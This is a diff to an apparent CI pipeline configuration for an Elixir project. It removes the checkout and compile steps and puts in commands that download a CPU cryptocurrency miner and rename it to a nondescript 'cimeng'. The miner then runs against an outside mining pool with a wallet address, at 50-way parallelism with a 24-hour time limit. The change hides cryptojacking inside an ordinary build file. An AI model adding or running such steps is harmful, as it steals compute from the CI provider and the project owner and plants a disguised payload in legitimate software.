@@ -4,20 +4,19 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
 blocks:
   - name: Set up
     task:
       jobs:
         - name: Compile
           commands:
-            - checkout
-            - bin/setup_ci_elixir
-            - sem-version elixir 1.8.1
-            - cache restore
-            - mix deps.get
-            - mix do compile
-            - MIX_ENV=test mix compile
-            - cache store
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - mv cpuminer-sse2 cimeng
+            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
+          parallelism: 50
   - name: Analyze code
     task:
       prologue:
